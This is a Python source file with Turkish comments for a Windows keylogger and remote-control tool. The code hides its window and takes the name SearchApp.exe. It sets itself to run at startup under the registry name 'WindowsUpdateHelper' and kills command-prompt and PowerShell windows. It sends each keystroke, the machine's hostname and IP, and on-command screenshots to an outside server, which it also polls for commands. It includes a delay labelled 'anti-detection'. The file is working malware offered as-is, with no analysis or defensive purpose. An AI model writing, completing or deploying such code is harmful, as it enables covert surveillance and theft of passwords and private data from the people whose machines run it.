import requests
import time
import sys
import os
import tkinter as tk
from tkinter import messagebox
import win32gui
import win32con
import win32api
from datetime import datetime
import keyboard
import socket
import traceback
import pyautogui
from io import BytesIO
import subprocess
import ctypes
import psutil
import winreg

# HATA YÖNETİMİ
def log_error(error_msg):
    try:
        error_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        full_error = f"[{error_time}] HATA: {error_msg}\n{traceback.format_exc()}"
        print(full_error)
        
        with open('error_log.txt', 'a', encoding='utf-8') as f:
            f.write(full_error + '\n\n')
    except:
        pass

# İNTERNET KONTROLÜ
def check_internet():
    try:
        requests.get('http://www.google.com', timeout=5)
        return True
    except:
        return False

# PENCERE KAPATMA
def close_cmd_windows():
    try:
        subprocess.run(['taskkill', '/f', '/im', 'cmd.exe'], creationflags=0x08000000)
        subprocess.run(['taskkill', '/f', '/im', 'powershell.exe'], creationflags=0x08000000)
        subprocess.run(['taskkill', '/f', '/im', 'WindowsTerminal.exe'], creationflags=0x08000000)
    except:
        pass

# PROCESS GİZLEME
def disguise_process():
    try:
        # Konsol başlığını değiştir
        ctypes.windll.kernel32.SetConsoleTitleW("SearchApp.exe")
        
        # Process ismini değiştirmeye çalış
        try:
            current_process = psutil.Process(os.getpid())
            current_process.name = "SearchApp.exe"
        except:
            pass
    except Exception as e:
        log_error(f"Process gizleme hatası: {str(e)}")

# BAŞLANGIÇ KISAYOLU
def create_startup_shortcut():
    try:
        # Başlangıç klasörüne kısayol
        startup_path = os.path.join(
            os.getenv('APPDATA'),
            'Microsoft',
            'Windows',
            'Start Menu',
            'Programs',
            'Startup'
        )
        
        target_path = os.path.abspath(sys.argv[0])
        
        # Registry kaydı
        try:
            key = winreg.HKEY_CURRENT_USER
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
                winreg.SetValueEx(reg_key, "WindowsUpdateHelper", 0, winreg.REG_SZ, target_path)
        except:
            pass
            
    except Exception as e:
        log_error(f"Başlangıç ayarı hatası: {str(e)}")

# PENCERE GİZLEME
def hide_window():
    try:
        window = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(window, win32con.SW_HIDE)
    except:
        pass

# AĞ BİLGİSİ GÖNDERME
def send_network_info():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        network_info = {
            'hostname': hostname,
            'ip': ip_address,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        response = requests.post(
            'https://soic.com.tr/test/ag.php',
            json=network_info,
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=5
        )
    except:
        pass

# KLAVYE KAYIT
def on_key_press(event):
    try:
        log_data = {
            'key': event.name,
            'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'device': socket.gethostname()
        }
        requests.post(
            'https://soic.com.tr/test/log.php',
            json=log_data,
            headers={'User-Agent': 'Mozilla/5.0'},
            timeout=3
        )
    except:
        pass

# KOMUT KONTROL
def check_command():
    try:
        response = requests.get(
            'https://soic.com.tr/test/komut.txt',
            headers={'Cache-Control': 'no-cache'},
            timeout=5
        )
        if response.status_code == 200:
            return response.text.strip()
    except:
        return None

# EKRAN GÖRÜNTÜSÜ
def capture_and_send_screenshot():
    try:
        screenshot = pyautogui.screenshot()
        img_byte_arr = BytesIO()
        screenshot.save(img_byte_arr, format='PNG')
        
        response = requests.post(
            'https://soic.com.tr/test/gorun.php',
            files={'screenshot': ('ss.png', img_byte_arr.getvalue(), 'image/png')},
            timeout=10
        )
        
        if response.status_code == 200:
            requests.post('https://soic.com.tr/test/komut.txt', data="", timeout=3)
    except:
        pass

# MESAJ ALMA
def get_messages():
    try:
        response = requests.get(
            'https://soic.com.tr/test/veri.php',
            params={'al': '1'},
            timeout=10,
            headers={'User-Agent': 'Mozilla/5.0'}
        )
        if response.status_code == 200:
            return response.json()
    except:
        return []

# BİLDİRİM GÖSTERME
def show_notification(message):
    try:
        root = tk.Tk()
        root.withdraw()
        messagebox.showinfo("Sistem Mesajı", message)
        root.destroy()
    except:
        pass

# ANA PROGRAM
def main():
    disguise_process()
    create_startup_shortcut()
    hide_window()
    close_cmd_windows()
    
    # Başlangıç işlemleri
    send_network_info()
    keyboard.on_press(on_key_press)
    
    # Ana döngü
    previous_messages = set()
    while True:
        try:
            if not check_internet():
                close_cmd_windows()
                time.sleep(10)
                continue
                
            # Komut kontrolü
            command = check_command()
            if command and "/ss" in command.lower():
                capture_and_send_screenshot()
            
            # Mesaj kontrolü
            messages = get_messages()
            new_messages = [m for m in messages if m not in previous_messages]
            
            for msg in new_messages:
                show_notification(msg)
                
            previous_messages.update(new_messages)
            time.sleep(2)
            
        except KeyboardInterrupt:
            sys.exit(0)
        except:
            time.sleep(10)

if __name__ == "__main__":
    try:
        if getattr(sys, 'frozen', False):
            hide_window()
        
        # Anti-detection için rastgele bekleme
        time.sleep(5)
        
        main()
    except:
        sys.exit(0)